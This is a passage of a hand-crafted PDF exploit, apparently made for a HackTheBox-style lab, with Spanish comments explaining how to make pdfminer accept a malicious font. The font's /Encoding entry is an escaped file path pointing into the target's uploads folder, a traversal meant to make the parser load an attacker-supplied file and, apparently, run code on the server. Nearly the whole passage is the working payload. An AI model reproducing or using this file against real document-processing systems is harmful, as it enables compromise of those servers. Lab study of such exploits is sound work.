   /Resources << /Font << /F1 5 0 R >> >> >>
endobj

4 0 obj
<< /Length 44 >>
stream
BT /F1 12 Tf 100 700 Td (Malicious PDF) Tj ET
endstream
endobj

5 0 obj
<< /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H
   /Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fe
   /DescendantFonts [6 0 R] >>
endobj

% EL OBJETO 6 ES EL QUE PROBABLEMENTE FALLA.
% Aseguramos que sea un CIDFontType2 válido con todas las entradas requeridas.
6 0 obj
<< /Type /Font /Subtype /CIDFontType2 /BaseFont /MaliciousFont
   /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >>
   /FontDescriptor 7 0 R
   /DW 1000
   /CIDToGIDMap /Identity   % <-- ESTA LÍNEA ES CLAVE. Sin ella, pdfminer puede ignorar la fuente.
>>
endobj

7 0 obj
<< /Type /FontDescriptor /FontName /MaliciousFont /Flags 4
   /FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0
   /Ascent 1000 /Descent -200 /CapHeight 800 /StemV 80 >>
endobj

